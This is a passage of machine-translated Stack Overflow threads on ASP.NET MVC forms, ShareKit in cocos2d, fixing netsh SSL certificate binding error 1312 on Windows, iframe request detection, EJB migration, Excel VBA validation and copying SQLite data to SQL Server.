        @Html.ValidationMessageFor(model => model.note.content)
    </div>
    <input type="submit" value ="Save" />
} @* //End create form *@ 

<!-- List Area -->

@foreach (var note in Model.noteList)
{
    using(Html.BeginForm()){
        @Html.Hidden("note.id", note.id);
        @Html.EditorForModel()
        <div class="userIdArea"><b>@note.userId</b></div>  
        <div class="noteArea">@note.content</div>  
        <br />
        <div class="editor-label">
            @Html.LabelFor(model => model.note.userId)
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => note.userId, new { id = "A"})
            @Html.ValidationMessageFor(model => note.userId)
        </div>
        <div class="editor-field">
            @Html.TextAreaFor(model => note.content)
            @Html.ValidationMessageFor(model => note.content)
        </div>
        <input type="submit" value="Edit" />
    }
} 
```

和，

模型，

```
public class Note
{
    [Key]
    public int id { get; set; }

    [Required(ErrorMessage="Content is required")]
    [DisplayName("Note")]
    public string content { get; set; }
    public DateTime date { get; set; }

    [Required(ErrorMessage = "User ID is required")]
    [DisplayName("User ID")]
    public string userId {get; set;}
    public Boolean isPrivate { get; set; }
    public virtual ICollection<AttachedFile> AttachedFiles { get; set; }

} 
```

查看模型，

```
public class NoteViewModel
{
    public IEnumerable<Note> noteList { get; set; }
    public Note note { get; set; }
} 
```

控制器，

```
public ActionResult Index()
{
    var notes = unitOfWork.NoteRepository.GetNotes();
    return View(new NoteViewModel(){noteList=notes.ToList(), note = new Note()});
}

[HttpPost]
public ActionResult Index(Note note)
{
    try
    {
    if (ModelState.IsValid)
    {
        unitOfWork.NoteRepository.InsertNote(note);
        unitOfWork.Save();
        return RedirectToAction("Index");
    }
    }catch(DataException){
    ModelState.AddModelError("", "Unable to save changes. Try again please");
    }

    var notes = unitOfWork.NoteRepository.GetNotes();
    return View(new NoteViewModel() { noteList = notes.ToList(), note = new Note() });
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:43:54.067

如果您愿意，您实际上可以这样做（不需要使用`model`）：

```
@Html.LabelFor(model => note.userId)
@Html.ValidationMessageFor(model => note.userId)
@Html.ValidationMessageFor(model => note.content) 
```

有时我将 lambda 变量名称更改为`_`，以表明`model`不重要（但如果您愿意，它是可选的）：

```
@Html.LabelFor(_ => note.userId)
@Html.ValidationMessageFor(_ => note.userId)
@Html.ValidationMessageFor(_ => note.content) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:54:01.327

由于您正在迭代 for each 语句中的“note”变量，因此您的 html 助手将引用该“note”变量而不是模型。解决方案如下：

```
@foreach (var note in Model.noteList)
{
    using(Html.BeginForm()){
        @Html.Hidden("id", note.id);
        <div class="userIdArea"><b>@note.userId</b></div>  
        <div class="noteArea">@note.content</div>  
        <br />
        <div class="editor-label">
            @Html.LabelFor(note => note.userId)
        </div>
        <div class="editor-field">
            @Html.TextBoxFor(note => note.userId, new { @Value = note.userId })
            @Html.ValidationMessageFor(note => note.userId)
        </div>
        <div class="editor-field">
            @Html.TextAreaFor(note => note.noteList)
            @Html.ValidationMessageFor(note => note.content)
        </div>
        <input type="submit" value="Edit" />
    }
} 
```

# ios - Sharekit+Cocos2d Facebook 图像共享屏幕在横向模式下未正确定位

> ID：13076913
> 
> 赞同：0
> 
> 时间：2012-10-25T20:42:25.650
> 
> 标签：ios, cocos2d-iphone, sharekit

我正在使用带有 cocos2d 应用程序的 sharekit（应用程序是横向的），我没有收到任何错误，但是出现的共享屏幕处于纵向模式，大约覆盖了屏幕的 1/3。弹出的键盘处于横向模式（如预期的那样）。只有“取消”按钮可见。

编码：

```
self.vc =[[ViewController alloc] init];

[[[CCDirector sharedDirector] openGLView] addSubview:self.vc.view];
[[SHK currentHelper] setRootViewController:vc];

[[SHK currentHelper] setCurrentView:vc];

SHKItem *item;
item  = [SHKItem text:@"I HATE MOSQUITOS"];
[SHKFacebook shareItem:item]; 
```

库版本：ShareKit 2.0

额外信息：

我也尝试过使用 SHKMail 组件，它也表现得像 SHKFacebook 的一部分。

问候，伊山

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:00:53.760

我猜你遇到这个问题是因为你以错误的方式创建 ViewController。

您`vc`不知道您当前的方向，因为您没有将其显示为模式，也没有将其添加到导航堆栈中。

可能有更好的方法，比如您可以使用应用程序根控制器。

您可能可以像这样获得正确的控制器：

```
UIViewController* vc = [[(AppDelegate*)[[UIApplication sharedApplication] delegate] window] rootViewController]; 
```

或像这样：

```
[(AppDelegate*)[[UIApplication sharedApplication] delegate] navController]; 
```

取决于您在 AppDelegate 中的内容（因为 cocos2d 模板）

所以然后做`[[SHK currentHelper] setRootViewController:vc];`，一切都会好起来的。顺便说一句，我可能因为版本的原因没有找到该方法`setCurrentView`，`SHK`但是如果您必须为 SHK 设置一些视图，只需使用`vc.view`或应用程序的窗口。不要对你的 GLView 做任何事情。

# ssl - 绑定到端口时添加 SSL 证书失败

> ID：13076915
> 
> 赞同：80
> 
> 时间：2012-10-25T20:42:36.617
> 
> 标签：ssl, https

我使用 WCF 创建了一个 WebService。我正在做自我托管，我想启用 HTTPS。根据我的理解，我需要创建一个证书并绑定到我想要使用的端口。

以下是我为处理此问题所做的步骤：

1.  在我的本地计算机上创建了一个证书作为根证书颁发机构
    *   makecert -n "CN=My Root Certificate Authority" -r -sv RootCATest.pvk RootCATest.cer
2.  打开 MMC.exe 并将保存的 .cer 文件导入“Trusted Root Certificate\Certificates\ 文件夹
    *   makecert -sk MyKeyName -iv RootCATest.pvk -n "CN=MyMachineName" -ic RootCATest.cer -sr localmachine -ss my -sky exchange -pe MyMachineName.cer
3.  从签名的根证书颁发机构创建临时服务证书

    *   makecert -sk MyKeyName -iv RootCATest.pvk -n "CN=MyMachineName" -ic RootCATest.cer -sr localmachine -ss my -sky exchange -pe MyMachineName.cer
4.  尝试将证书绑定到端口号（本例中为 443）

    *   netsh http 添加 sslcert ipport=0.0.0.0:443 certash=2c5ba85bcbca412a74fece02878a44b285c63981 appid={646937c0-1042-4e81-a3b6-47d678d68ba9}

第 4 步的结果是以下错误：

> SSL 证书添加失败，错误 1312
> 
> 指定的登录会话不存在。它可能已经被终止。

有谁知道为什么我可能会收到此错误？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2013-04-18T18:02:37.517

我有同样的错误。正如 Micheal 所说，第一次发生时，我不得不将证书移动到 Certificates(Local Computer) --> Personal -->Certificate 文件夹下。当我在另一台机器上导入相同的证书时，我遇到了同样的错误。原因是我使用 certmgr.msc 导入证书。. 因此打开的窗口显示“证书 - 当前用户”。使用此窗口导入的证书会导致 netsh 失败并出现 1312 错误。确保使用 MMC 中的证书管理单元来导入证书。MMC 的证书管理单元显示“证书（本地计算机）”。这让 netsh 执行顺利通过。

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2014-11-20T13:05:13.617

```
SSL Certificate add failed, Error 1312

A specified logon session does not exist. It may already have been terminated. 
```

我曾经遇到过完全相同的问题，并花了几天时间试图找出原因。

长话短说：问题是您在`winrm`没有 PRIVATE KEY 的服务器上安装了证书。

我已经检查了好几次了。您必须删除您的证书并使用`makecert`例如重建它，因为它在这里完美描述：http: [//blogs.technet.com/b/jhoward/archive/2005/02/02/365323.aspx](http://blogs.technet.com/b/jhoward/archive/2005/02/02/365323.aspx)

您可以轻松检查您的证书是否具有私钥，如下所示：`mmc`- `certificates`- `local machine`- `personal`。查看证书的图标 - 它必须在图标上有钥匙标志。

* * *

## 回答 #3

> 赞同：31
> 
> 时间：2017-01-18T13:20:59.953

我已经购买了**官方 Thawte 证书**，以通过我们的 Internet 服务器上的特定端口保护自托管（控制台应用程序）Web 服务。然后我收到了 Thawte 证书并在我们的 Internet 服务器上使用 mmc 安装了它（然后可以在“受信任的根证书颁发机构”下查看证书（图像上带有钥匙图标，表明证书包含私钥）这是强制性的能够将其绑定到端口 btw) 。

下一步是`<port>`为 https 启用：

```
netsh http add urlacl url=https://+:<port>/ user=everyone 
```

（什么没问题）

下一步是为 https 启用端口（）：

```
netsh http add sslcert ipport=0.0.0.0:<port> certhash=<thumbprint to certificate> appid={<guid to application>} 
```

这失败并显示错误消息：
**SSL 证书添加失败，错误：1312 指定的登录会话不存在。它可能已经被终止。**

然后我搜索了互联网并尝试了各种建议的解决方法（没有成功）。

我的情况的解决方案是将 certstorename=Root 添加到 netsh 命令：

```
netsh http add sslcert ipport=0.0.0.0:<port *1)> certstorename=Root certhash=<thumbprint to certificate *2)> appid={<guid to application *3)>} 
```

**注意：**
如果**没有**将 certstorename 应用于 net netsh 命令，netsh 采用**默认值，即什么是 MY**（针对证书存储：“<strong>Personal”，其中**自签名**证书正常存储）。
**根**以证书存储为目标：“受信任的根证书颁发机构”</p>

*1)：端口，您要使用的连接
*2)：您可以提取证书的指纹，如果您打开证书（在 Windows 系统上，只需在资源管理器中双击证书） - 选择选项卡“详细信息”并单击“指纹”。然后显示“指纹”并可以复制。复制指纹并删除所有空格...
*3)：作为 appid，您可以采用 {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 形式的任何 ID，因为 APPID 仅提供信息。使用命令“netsh http show sslcert”，您可以查询整台机器上绑定的证书，然后会看到信息，即哪个 appid 绑定到哪个证书（顺便说一句，在实践中并没有真正的帮助）在我的情况下，我采用了（来自VS生成）我的Web服务应用程序的GUID

* * *

## 回答 #4

> 赞同：21
> 
> 时间：2013-11-04T11:20:13.997

我一直在处理这个问题，我正在使用自托管的 WCF 服务。我刚刚取得了突破：

我在机器商店的人员文件夹中有一个证书。它过期了，我的经理发出了新的。新的对我来说失败了这个错误。我从谷歌尝试了很多东西，但最后，使用完全不同的解决方案解决了这个问题。

我安装了两个证书——过期的和新的。然后我使用这个命令来获取它们的列表：

`certutil -store My`

我得到这个输出（信息是假的，其他证书没有列出）：

```
================ Certificate 1 ================
Serial Number: 6d
Issuer: E=operations@voicetrust.com, CN=VoiceTrust Server CA, OU=VoiceTrust Oper
ations, O=VoiceTrust
 NotBefore: 03-Jan-2013 3:33 PM
 NotAfter: 03-Mar-2013 3:33 PM
Subject: E=hgulzar@voicetrust.com, CN=hornet.voicetrust.com, OU=Software Develop
ment, O=VoiceTrust eServices MENA FZ LLC, L=Dubai, C=AE
Non-root Certificate
Cert Hash(sha1): 98 5f a0 d3 11 6a 4b 64 3b db 0a a4 11 66 fc 08 28 74 7e 53
  Key Container = {E5BC0912-7808-4B89-B457-31946DE5990E}
  Unique container name: dfedfcc149408fb990a3bacd6d31126b_3277b2c9-9894-46d0-9b6
4-30f0d6589239
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Private key is NOT exportable
Encryption test passed

================ Certificate 2 ================
Serial Number: 6d
Issuer: E=operations@voicetrust.com, CN=VoiceTrust Server CA, OU=VoiceTrust Oper
ations, O=VoiceTrust
 NotBefore: 03-Nov-2013 3:33 PM
 NotAfter: 03-Dec-2013 3:33 PM
Subject: E=hgulzar@voicetrust.com, CN=hornet.voicetrust.com, OU=Software Develop
ment, O=VoiceTrust eServices MENA FZ LLC, L=Dubai, C=AE
Non-root Certificate
Cert Hash(sha1): 30 5f a0 d3 11 6a 4b 64 3b db 0a a4 11 66 fc 08 28 74 7e 53
  Key Container = {E5BC0912-7808-4B89-B457-31946DE5960E}
  *Unique container name:* 55edfcc149408fb990a3bacd6d31126b_3277b2c9-9894-46d0-9b6
4-30f0d6589239
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Private key is NOT exportable
Encryption test passed 
```

现在，一切似乎都正常，但如果我尝试将证书 1 绑定到端口，证书 1 已过期并且可以工作，而证书 2 失败并出现错误 1312。

让我感到困惑的关键区别是**唯一容器名称**属性。它应该代表硬盘驱动器上的物理密钥文件`%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\`

对于证书 1，该文件在那里，但对于证书 2，没有这样的文件。搜索后，我在文件夹的子文件夹中找到了针对证书 2 的`%AppData%\Microsoft\Crypto\`文件。那是用户特定的键而不是机器级键。令人惊讶的是，证书正在导入到计算机存储中，但它始终保留用户存储的容器密钥。

我删除了 AppData 文件夹下的“55edfcc149408fb990a3bacd6d31126b_3277b2c9-9894-46d0-9b64-30f0d6589239”文件，并在商店中为我的证书 2 运行了修复命令：

`certutil -repairstore My 2`

这一次，唯一容器名称反映了“%ProgramData%\Microsoft\Crypto\”下正确文件夹中的一个文件，一切都开始工作了。

希望这对某人有帮助。

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2014-06-03T22:47:10.597

我整天都在与错误 1312 作斗争，为我解决的问题是将 mmc 中的证书作为 .p12 文件而不是 .crt 导入。如果您使用 OpenSSL 创建它，那么一旦您创建了 .crt，请执行以下操作：

```
pkcs12 -export -in server.crt -inkey server.key -name “Your Name” -out server.p12 
```

[如上所述](http://www.faqforge.com/windows/use-openssl-on-windows/)。当您将其导入 mmc 时，它将是一个名为“个人信息交换”的文件（显然 .pfx 文件也可以使用）。

我是编写服务器和处理 SSL 的新手，我不知道为什么会这样，但我希望它会有所帮助。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-10-26T18:12:45.810

问题出在第 4 步。我使用根证书中的指纹作为 certash 中的值。为了解决这个问题，我不得不回到 MMC 并刷新证书（本地计算机）--> 个人 --> 证书文件夹。然后使用根证书颁发机构“颁发”的证书中的指纹。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2014-06-11T11:10:25.163

我的问题是 CER 文件没有附加私钥。

我使用这些 OpenSSL 命令附加了 PK：

```
openssl x509 -in server.der -inform DER -out server.pem -outform PEM
openssl pkcs12 -export -in server.pem -inkey serverkey.pem -out server.p12 
```

适用于 CER/DER 文件。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2015-10-26T16:43:13.223

我遇到了同样的问题并解决了使用此命令导入证书的问题：

`c:> certutil -importPFX certname.pfx`

现在使用以下命令显示证书：

`c:> certutil -store my`

在此命令之前，证书不会出现

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2017-01-09T17:13:12.460

这似乎很明显；但是，我认为它可以节省一些时间。我在我的个人证书文件夹（用于个人计算机帐户）下导入了一个扩展名为 .cer 的文件。过了一会儿，我意识到我需要导入扩展名为 *.pfx 的文件。解决了这个问题，瞧！问题解决了！

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2014-01-07T21:25:44.307

有多种接收此错误的方法（有关其他答案，请参见上文）。

接收此特定错误的另一种方法是在证书不在适当的存储区时尝试将证书绑定到端口。

验证证书是否存储在 localMachine 根存储中（您可以从命令行使用 certutil 或 certmgr.exe 正确转储它）。

更新语法:)

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-04-03T19:09:04.273

如果：

1.  你的机器上没有 IIS（比如说使用自托管的 WCF），并且
2.  您使用 IIS 管理器在另一台机器上提出了证书请求（因为您不明白私钥来自嵌入在证书请求中的密码 - 以及后来发布的`.pb7`）

然后：

1.  只需`.pb7`在用于发出证书请求的 IIS 机器上安装（本地机器/个人/证书 - 使用 mmc）；
2.  从该机器导出证书，包括其私钥（分配密码）；和
3.  在 WCF 服务器上使用 mmc 安装它（本地机器/个人/证书 - 使用 mmc）。

然后，`netsh`将让您绑定到端口 443。不再出现 1312 错误。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-02-24T16:12:44.087

只是把另一个答案扔进戒指，这就是我遇到的问题：

尽管我将证书导入`(Local Computer)\...`证书存储区，但我已将其导入该`Trusted Root Certification Authorities`部分。我需要将其导入该`Personal`部分，否则会发生此错误。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2019-07-18T17:44:58.470

如果您使用 .NET 导入证书，则必须使用特定的导入标志：

```
/// <summary>
/// Imports X.509 certificate from file to certificate store.
/// </summary>
/// <param name="fileName">Certificate file.</param>
/// <param name="password">Password.</param>
/// <param name="storeName">Store name.</param>
/// <param name="storeLocation">Store location.</param>
public static void ImportCertificate(string fileName, string password, StoreName storeName, StoreLocation storeLocation) {
    var keyStorageFlags =
        X509KeyStorageFlags.PersistKeySet
        | (storeLocation == StoreLocation.LocalMachine ? X509KeyStorageFlags.MachineKeySet : X509KeyStorageFlags.UserKeySet);
    var cert = new X509Certificate2(fileName, password, keyStorageFlags);
    var store = new X509Store(storeName, storeLocation);
    store.Open(OpenFlags.MaxAllowed);
    store.Add(cert);
    store.Close();
} 
```

该`ImportCertificate`方法是`Woof.Security`我创建的包的一部分。

*   [https://github.com/HTD/Woof.Security](https://github.com/HTD/Woof.Security)

*   [https://www.nuget.org/packages/Woof.Security/](https://www.nuget.org/packages/Woof.Security/)

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2017-09-27T21:00:27.663

如果其他人遇到这个问题并且这里的答案没有明确回答，则潜在的核心问题是需要导入私钥。如果您在导入证书时*没有*将证书标记为可导出，则不会导入私钥并且无法绑定它。如果您将其删除并重新导入并将其标记为可导出，那么它将起作用。

正如其他人所指出的，它还需要是本地机器存储。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2018-12-03T17:12:28.423

就我而言，我缺少证书 **私钥。**

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2015-01-29T08:37:10.167

即使我的 .pfx 文件有私钥，我也遇到了完全相同的问题。使用 MMC 控制台添加证书是成功的，但使用 .Net X509Store.Add(X509Certificate2) 方法以编程方式添加每次都失败，错误 1312。证书甚至在图标上有一个键符号。
几天后，最终决定按照此处帖子中的建议使用 makecert.exe 制作新证书。之后一切都很好。密钥出现在 %ProgramData%\Microsoft\Crypto\RSA\MachineKeys 中。由于某种原因，我之前的 pfx 文件不兼容。

根据我的经验，只要您的密钥没有出现在 %ProgramData%\Microsoft\Crypto\RSA\MachineKeys\ 中，与“netsh http add sslcert ....”绑定就会失败。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2021-02-23T22:51:43.600

这是我对这个线程中所有修复以及它对我的工作方式的总结：

1.  找到“Windows PowerShell”，右键单击该图标，然后选择“以管理员身份运行”。
2.  找到“写字板”，右键单击图标，选择“以管理员身份运行”。（这样您就可以在 PowerShell 和写字板之间进行复制和粘贴。）
3.  在 PowerShell 中运行“netsh HTTP show sslcert”。
4.  从显示的信息中，复制“证书哈希”、“应用程序 ID”和“证书存储名称”。（稍后您将需要所有这些。）
5.  （如果需要）找到您的 *.cer 或 *.crt 文件并将其导出为 *.pfx 文件。
6.  在 Powershell 中，导航到 *.pfx 文件所在的文件夹。
7.  现在运行“certutil -importPFX .pfx”。
8.  然后运行“certutil -store my”以显示已安装的证书。
9.  现在使用第 4 步中的信息运行此“netsh http add sslcert ipport=0.0.0.0:8000 certstorename= certhash= appid='' （我必须将它们按此顺序排列，带有我的证书商店名称和单引号应用程序 ID。）
10.  通过再次运行“netsh HTTP show sslcert”检查是否添加了 SSL 证书。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2017-05-08T10:56:13.510

我刚刚又犯了一个错误。我使用相同的私钥从我们的 CA 更新了我们的 WorkFolders 服务的过期证书。然后我总是得到错误 1312。即使证书管理显示我有一个私钥。
我只能通过重新颁发新证书（没有更新选项）来解决问题。然后它在第一次尝试中起作用。
也许这会帮助那些也尝试过更新选项的人。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-06-09T15:14:57.420

对我来说，问题是通过确保我在命令行中使用的证书哈希与安装在我的服务器上的证书相对应来解决的：

netsh http 添加 sslcert ipport=0.0.0.0:8081 certash= **1061a577f0cc1c428186000dc84f02a7111ca1b2** appid={GUID}

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2017-04-28T19:37:53.200

所以添加（还）修复/情况。

我有使用 BouncyCastle 创建自签名证书的 C# 代码。

```
<packages>
  <package id="BouncyCastle" version="1.8.1" targetFramework="net45" /> 
```

所以我的代码创建了证书并将它们放在 Cert-Store 中的正确位置。

使用此处的提示，我安装的 On Premise Service Bus 1.1 失败了……这导致我来到这里。

我最终删除了我的 BouncyCastle 代码创建的两个证书（从证书存储）并重新导入它们（使用私钥）......并且一切正常。我将 FIRST 导入到

> 证书（本地计算机）/个人/证书

然后我将粘贴的（在 mmc 中）复制到我需要的任何其他地方（商店）。

在 MMC 中，我的“之前”和“之后”看起来完全一样，但它解决了这个问题。去搞清楚。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2017-01-17T07:28:52.030

就我而言，在创建证书时，我为我的证书存储名称选择了一个不同于 My 的名称。默认名称为 MY。**因此，如果您的不同，请将您提供的商店名称**附加到命令中。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2020-08-28T15:04:39.083

在我这边，提供的文件是一个 P7B 文件和一堆证书文件。卡住后，我向同事寻求帮助，他给了我一个想法，通过 PFX 将证书与私钥一起导入。

本文为我提供了将 P7B 文件转换为 PFX 的说明[。](https://www.ssl.com/how-to/create-a-pfx-p12-certificate-file-using-openssl/)总而言之，您只需执行以下操作：

1.  先用openssl把P7B文件转成PEM
2.  将 PEM 文件转换为 PFX

您现在可以导入 PFX 文件。最好阅读我上面提到的文章，因为它有重要的信息需要注意。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2016-06-09T14:45:13.963

`certstorename`参数应该是来自 .net 框架命名空间的[StoreName](https://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.storename(v=vs.110).aspx)枚举的字符串值`System.Security.Cryptography.X509Certificates`。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2016-07-11T16:09:09.097

我已经为此工作了几个小时，基本上通读了上面@DoomerDGR8 所说的内容，但我的修复要简单得多。我跑了

```
 C:\Windows\system32> certutil -store TRUSTEDPUBLISHER 
```

这列出了我已安装的几个证书，然后我在使用 netsh 安装时遇到问题的证书上运行了**修复商店。**

```
C:\Windows\system32> certutil -repairstore TRUSTEDPUBLISHER 6 
```

末尾的数字**6代表您的证书索引，在商店中找到，希望对您有所帮助**

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2017-01-31T10:46:43.797

我在使用 OpenSSL(BouncyCastle) 创建自签名证书时遇到了同样的错误我在这篇文章的帮助下解决了这个问题： [Cannot export generated certificate with private key to byte array in .net 4.0/4.5](https://stackoverflow.com/questions/16419911/cannot-export-generated-certificate-with-private-key-to-byte-array-in-net-4-0-4)

我不得不补充：

```
 RsaPrivateKeyStructure rsa = RsaPrivateKeyStructure.GetInstance(seq); //new RsaPrivateKeyStructure(seq);
        RsaPrivateCrtKeyParameters rsaparams = new RsaPrivateCrtKeyParameters(
            rsa.Modulus, rsa.PublicExponent, rsa.PrivateExponent, rsa.Prime1, rsa.Prime2, rsa.Exponent1, rsa.Exponent2, rsa.Coefficient);

        var rsaPriv = DotNetUtilities.ToRSA(rsaparams);

        var cspParams = new CspParameters
        {
            KeyContainerName = Guid.NewGuid().ToString(),
            KeyNumber = (int)KeyNumber.Exchange,
            Flags = CspProviderFlags.UseMachineKeyStore
        };

        var rsaPrivate = new RSACryptoServiceProvider(cspParams);**

        // Import private key from BouncyCastle's rsa
        rsaPrivate.ImportParameters(rsaPriv.ExportParameters(true));

        // Set private key on our X509Certificate2
        x509.PrivateKey = rsaPrivate; 
```

# javascript - 检测来自 iframe 的 http 请求

> ID：13076919
> 
> 赞同：2
> 
> 时间：2012-10-25T20:42:52.290
> 
> 标签：javascript, jquery, http, iframe

好的，我的情况是我在页面上有一个 iframe，即调用不同域上的 url。这个 url 有时会隧道（不是完全重定向）到与我调用的不同的 url。我知道我无法查看 iframe 的内容，因为我正在调用不同的域，但是有没有办法检测到与 iframe 的 src 属性不同的 url？例如，有没有办法检测来自页面的 http 请求？

如果 url 被隧道到不同的 url，那么我需要将用户重定向到当前页面，因为这意味着他们的会话已经过期（我知道这没有多大意义，应该有更好的检测方法会话已死，但这是我现在必须这样做的唯一方法）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:45:20.587

下载 Fiddler 并配置您的浏览器，它将显示通过您的应用程序的所有 HTTP 请求。您还可以在 Firefox 中安装 firebug 扩展，并在 Firebug 的“Net”选项卡中检查 HTTP 请求。

使用 Fiddler 捕获跨域请求 [http://blog.caplin.com/2010/03/19/using-fiddler-to-help-develop-cross-domain-capable-javascript-web-applications/](http://blog.caplin.com/2010/03/19/using-fiddler-to-help-develop-cross-domain-capable-javascript-web-applications/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:46:09.620

您可以在“不同来源” iframe 中挂钩的唯一内容是 iframe 本身的 onload 事件。对于其他任何事情，您都需要一个插件。

# jakarta-ee - 从 EJB 2.0 到 EJB 3.0

> ID：13076921
> 
> 赞同：0
> 
> 时间：2012-10-25T20:43:02.857
> 
> 标签：jakarta-ee, ejb-3.0, websphere-7, remoteobject, initial-context

这是我必须创建 EJB 2.0 的代码我如何转换它以便可用于 EJB 3.0

```
java.lang.Object ejbHomeStub = initCtx.lookup(ejbJNDIName);
EJBHome ejbHome = (EJBHome) 
    javax.rmi.PortableRemoteObject.narrow(ejbHomeStub, EJBHome.class);
EJBMetaData ejbMetaData = ejbHome.getEJBMetaData();
Class ejbHomeClass = ejbMetaData.getHomeInterfaceClass();
//get ejb object of home interface type
ejbHome = (EJBHome) javax.rmi.PortableRemoteObject.narrow(ejbHome, ejbHomeClass);
//create ejb remote object
Method ejbMethodCreate = ejbHomeClass.getDeclaredMethod(EJB_CREATE, null);
ejbRemoteObj = (EJBObject) ejbMethodCreate.invoke(ejbHome, null); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T14:11:13.240

如果您的意思是“如何将 EJB 3.0 接口添加到我的 EJB 2.0 JAR 中”，那么您不需要转换客户端或 bean，因为 EJB 3.0 向后兼容 EJB 2.0。相反，只需更新 ejb-jar.xml 以删除 XSD，添加 XSD+xmlns，并更新`<ejb-jar/>`.

如果您的意思是“我如何将其转换为注释”，则`@RemoteHome`在 bean 类上使用注释，并保持接口相同。

如果您的意思是“我如何将 EJB 转换为使用业务接口而不是家庭”，那么您不能直接这样做，因为您必须先验地知道业务接口的类型：

```
java.lang.Object businessObjectStub = initCtx.lookup(ejbJNDIName);
BusinessObject businessObject = (BusinessObject)
    javax.rmi.PortableRemoteObject.narrow(businessObjectStub, BusinessObject.class); 
```

（一些应用程序服务器不需要 EJB 3.0 的窄，但 WebSphere Application Server 7.0 需要。）

# excel - 基于下拉菜单中选择的文本框的VBA动态验证

> ID：13076922
> 
> 赞同：0
> 
> 时间：2012-10-25T20:43:12.217
> 
> 标签：excel, vba

全部。我在工作表中有一个名为 lookupMisc 的表，**名为**periodNo *(A)*和*periodName (B)*，具有以下值。

```
A   B
1   09:00
2   10:00
3   11:00
4   12:00
5   13:00
6   14:00
7   15:00
8   16:00
9   17:00 
```

代码如下：

```
 For i = 1 To ws_misc.Range("periodNo").Rows.Count
        CombinedName = periodNo(i, 1) & " - " & periodName(i, 1)
        cbo_period.AddItem CombinedName
    Next i 
```

并且 thsi 生成：

![在此处输入图像描述](../Images/c804140a9ae65be845be72ebba0cfdb3.png)

现在您会注意到右侧有一个**Length** ( **txt_length** ) 文本字段。基本上，我正在尝试根据该期间的条目创建一种动态验证形式。以下是案例：

```
If user selects  Then
1 - 09:00        Length can only accept values from 1-9
2 - 10:00        Length can only accept values from 1-8
3 - 11:00        Length can only accept values from 1-7
4 - 12:00        Length can only accept values from 1-6
5 - 13:00        Length can only accept values from 1-5
6 - 14:00        Length can only accept values from 1-4
7 - 15:00        Length can only accept values from 1-3
8 - 16:00        Length can only accept values from 1-2
9 - 17:00        Length can only accept values from 1-1 
```

我将如何实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:47:34.317

尝试类似：

```
if me.txt_length.value<1 or me.txt_length.value>10-clng(left(me.cbo_period.value,1)) then
    msgbox "Entry must be between 1 and " & 10-clng(left(me.cbo_period.value,1))
end if 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:19:22.603

您可以将数据验证放在基于下拉列表中选择的值的长度单元格中：

![数据验证示例1](../Images/406c978d7605d7487f66906a59f1b652.png)

![数据验证示例2](../Images/bb35457af5aeb29dc8c94d7972cb956b.png)

祝你好运。

# .net - 将数据从 sqlite 复制到 SQL Server

> ID：13076923
> 
> 赞同：3
> 
> 时间：2012-10-25T20:43:14.930
> 
> 标签：.net, sql-server, sqlite

在 C# 中是否有一种方法无需读取数据表即可将 sqlite 表复制到 SQL Server？

sqlite 数据库在内存中并包含数百万行，因此除非绝对必要，否则我不想将其复制到数据表中。

感谢 KevCri

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-11-23T14:47:59.280

即使这个问题很老，我还是想用一些源代码来回答，以供将来参考。我遇到了完全相同的问题并找到了这篇文章。我创建了这个可以解决问题的控制台应用程序。它仅适用于表格，不适用于视图，而且我只在有限的数据集上进行了测试。但理论上它应该将任何 SQLite 数据库转换/复制到 Microsoft SQL Server，并且只使用很少的内存。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Data.SqlClient;
using System.Data;

namespace SQLite2MSSQL
{
  class Program
  {
    private static SQLiteConnection m_sqlitecon;
    private static SqlConnection m_sqlcon;

    private static List<KeyValuePair<string, string>> getSQLiteSchema(string tablename)
    {
        using (var cmd = new SQLiteCommand("PRAGMA table_info(" + tablename + ");", m_sqlitecon))
        {
          var table = new DataTable();

          SQLiteDataAdapter adp = null;
          try
          {
            adp = new SQLiteDataAdapter(cmd);
            adp.Fill(table);
            List<KeyValuePair<string, string>> res = new List<KeyValuePair<string, string>>();
            for (int i = 0; i < table.Rows.Count; i++)
            {
              string key = table.Rows[i]["name"].ToString();
              string value = table.Rows[i]["type"].ToString();
              KeyValuePair<string, string> kvp = new KeyValuePair<string, string>(key, value);

              res.Add(kvp);
            }
            return res;
          }
          catch (Exception ex) { Console.WriteLine(ex.Message); }
        }
      return null;
    }

    private static void transfer(string tablename, List<KeyValuePair<string, string>> schema)
    {
